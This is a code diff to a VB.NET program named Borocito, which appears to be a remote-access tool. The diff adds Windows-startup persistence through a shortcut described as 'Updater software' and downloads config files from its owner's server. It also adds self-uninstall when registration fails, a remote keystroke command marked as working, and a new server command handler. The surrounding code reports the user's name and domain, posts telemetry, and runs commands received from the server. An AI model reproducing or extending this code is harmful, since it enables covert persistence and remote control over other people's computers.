@@ -99,6 +99,8 @@ Module StartUp
                 LoadRegedit()
                 'Actualizaciones de telemtria
                 StartRefreshTelemetry(True)
+                'Lee los archivos de configuracion del servidor
+                ConfigFiles()
                 'iniciar todo lo demas.
                 '   Escuchar comandos desde el servidor
                 CommandListenerManager(True)
@@ -180,10 +182,30 @@ Module StartUp
     Sub StartWithWindows()
         Try
             AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
-            If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe") Then
-                My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
+            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe") Then
+            '    My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
+            'End If
+            'My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
+            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat") = False Then
+            '    Dim CMDContent As String = "@echo off" &
+            '    vbCrLf & "title Borocito CLI" &
+            '    vbCrLf & "cd " & """" & DIRCommons & """" &
+            '    vbCrLf & "start " & "BorocitoUpdater.exe" &
+            '    vbCrLf & "exit"
+            '    My.Computer.FileSystem.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat", CMDContent, False, System.Text.Encoding.ASCII)
+            'End If
+            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
+            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
+                Dim WSHShell As Object = CreateObject("WScript.Shell")
+                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
+                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
+                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
+                'Shortcut.Arguments = " /StartBorocito"
+                Shortcut.WindowStyle = 1
+                Shortcut.Description = "Updater software for Borocito"
+                Shortcut.Save()
+                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
             End If
-            My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
         Catch ex As Exception
             AddToLog("StartWithWindows@StartUp", "Error: " & ex.Message, True)
         End Try
@@ -239,6 +261,7 @@ Module Network
             response.Close()
         Catch ex As Exception
             AddToLog("ReportMeToServer(CreateUser)@Network", "Error: " & ex.Message, True)
+            Uninstall()
         End Try
         Try
             'Create CMD file on server
@@ -263,11 +286,11 @@ Module Network
             response.Close()
         Catch ex As Exception
             AddToLog("ReportMeToServer(CreateCMD)@Network", "Error: " & ex.Message, True)
+            Uninstall()
         End Try
     End Sub
     Sub SendFirstTelemetry()
         Try
-
             Dim reportContent As String = tlmContent
             Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/telemetryPost.php")
             request.Method = "POST"
@@ -530,7 +553,7 @@ Module Network
                             Dim Arg() As String = CommandCMD.Split(",")
                             Payloads.uploadAfile(Arg(0), Arg(1))
 
-                        ElseIf CMD1.Contains("/Payloads.SendTheKeys=") Then 'No Funciona. pero ve que quiere funcionar.
+                        ElseIf CMD1.Contains("/Payloads.SendTheKeys=") Then 'Funciona.
                             Dim Arg() As String = CommandCMD.Split(",")
                             Payloads.SendTheKeys(Arg(0), Arg(1))
 
@@ -586,6 +609,9 @@ Module Network
                         ElseIf CMD1.Contains("/Status") Then 'Funciona.
                             CommandResponse = My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName
 
+                        ElseIf CMD1.StartsWith("boro-get") Then
+                            CommandResponse = BORO_GET_ADMIN(CMD1)
+
                         End If
                     Catch ex As Exception
                         CommandResponse = "[" & CMD1 & "]Error: " & ex.Message
@@ -605,12 +631,28 @@ Module Network
         End While
     End Sub
     Sub ReadConfigFile()
-        While True
-            Try
+        Try
 
-            Catch ex As Exception
-                AddToLog("ReadConfigFile@Network", "Error: " & ex.Message, True)
-            End Try
-        End While
+        Catch ex As Exception
+            AddToLog("ReadConfigFile@Network", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub ConfigFiles()
+        Try
+            'Verificar que el fichero no exista en local
+            If My.Computer.FileSystem.FileExists(DIRCommons & "\Client.ini") Then
+                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Client.ini")
+            End If
+            If My.Computer.FileSystem.FileExists(DIRCommons & "\General.ini") Then
+                My.Computer.FileSystem.DeleteFile(DIRCommons & "\General.ini")
+            End If
+            'Descargar el fichero desde el servidor
+            My.Computer.Network.DownloadFile(HttpOwnerServer & "/Client.ini", DIRCommons & "\Client.ini")
+            My.Computer.Network.DownloadFile(HttpOwnerServer & "/GlobalSettings.ini", DIRCommons & "\General.ini")
+            'Leerlo
+            '   nah xd
+        Catch ex As Exception
+            AddToLog("ConfigFiles@Network", "Error: " & ex.Message, True)
+        End Try
     End Sub
 End Module
